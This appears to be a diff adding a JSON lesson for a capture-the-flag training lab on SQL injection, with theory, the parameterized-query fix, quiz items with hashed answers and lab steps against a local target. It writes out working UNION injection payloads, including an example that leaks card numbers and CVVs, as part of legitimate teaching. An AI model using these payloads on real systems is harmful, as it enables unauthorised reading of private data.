@@ -1,0 +1,54 @@
+{
+  "order": 3,
+  "id": "sqli",
+  "title": "SQL Injection",
+  "track": "OWASP Top 10",
+  "difficulty": "core",
+  "estimate": "20 min",
+  "brief": "**Ticket:** the user search box seems to run straight into the database. Prove you can read data you shouldn't, and capture what's in the hidden vault.",
+  "theory": "## SQL Injection (OWASP A03)\nThe server builds a query by gluing your input into a string, so SQL syntax in your input changes the query. `' OR '1'='1` returns everything; `UNION SELECT` reads other tables.\n\n**Fix:** parameterized queries \u2014 the query text and your data travel separately, so input can't change the query.",
+  "worked_example": "```\n$ curl -s -G https://x/api/search --data-urlencode \"q=a' UNION SELECT card,cvv FROM cards-- -\"\n[{\"card\":\"4111...\",\"cvv\":\"123\"}]   # leaked another table\n```",
+  "knowledge_check": [
+    {
+      "q": "The fix for SQLi is ___ queries",
+      "type": "choice",
+      "choices": [
+        "concatenated",
+        "parameterized",
+        "dynamic",
+        "cached"
+      ],
+      "answer_sha256": "f7e9e7e32354d1077e603617c08b6543015f7fc229760a46c820cacd1f2db729"
+    },
+    {
+      "q": "`' OR '1'='1` works because the condition is always ___",
+      "type": "choice",
+      "choices": [
+        "false",
+        "true",
+        "null",
+        "empty"
+      ],
+      "answer_sha256": "b5bea41b6c623f7c09f1bf24dcae58ebab3c0cdd90ad966bc43a45b44867e12b"
+    }
+  ],
+  "investigation": {
+    "intro": "Use a UNION to read the hidden `secrets` table.",
+    "steps": [
+      "```bash\ncd /workspaces/examto/ctf-lab\npython3 -m venv .venv 2>/dev/null; . .venv/bin/activate 2>/dev/null; pip install -q -r requirements.txt\npython3 target/run_target.py        # leave this running\n```",
+      "In a second terminal, inject a UNION (note -G --data-urlencode so curl encodes the quotes/spaces):\n```bash\ncurl -s -G http://127.0.0.1:5000/api/search --data-urlencode \"username=' UNION SELECT flag, label FROM secrets-- -\"\n```",
+      "The flag comes back in the `username` field of the result."
+    ],
+    "hints": [
+      "Break out of the quoted string with a single quote.",
+      "The query selects two columns, so your UNION must select two.",
+      "The flag is the first column of the secrets table."
+    ]
+  },
+  "capture": {
+    "task": "**Capture the flag.** Leak the `secrets` table via UNION injection and submit the `FLAG{...}`.",
+    "hint": "' UNION SELECT flag, label FROM secrets-- -",
+    "placeholder": "FLAG{...}",
+    "answer_sha256": "edd5168bc064d7c9be8ff373c518b211fd59f3295d2e4d1f98589cafd32d7b6d"
+  }
+}
